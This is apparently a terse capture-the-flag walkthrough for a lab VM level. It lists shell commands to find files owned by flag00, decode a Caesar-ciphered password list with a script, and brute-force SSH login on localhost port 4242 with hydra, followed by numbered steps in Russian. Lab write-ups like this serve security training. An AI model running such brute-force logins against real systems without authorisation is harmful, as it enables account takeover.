`find / -user flag00 2>&1 | grep -v "Permission denied\|No such file or directory" >&2`

`chmod +r level02.pcap`

`python script.py {pwd} > pwds.txt`

`hydra -l flag00 -P pwds.txt  ssh://127.0.0.1:4242`

1) Ищем файлы-подсказки
2) Скачиваем файл по scp
3) Даем ему права на чтение
4) Запускаем скрипт расшифровки с помощью шифра Цезаря
5) Запускаем hydra для взлома пароля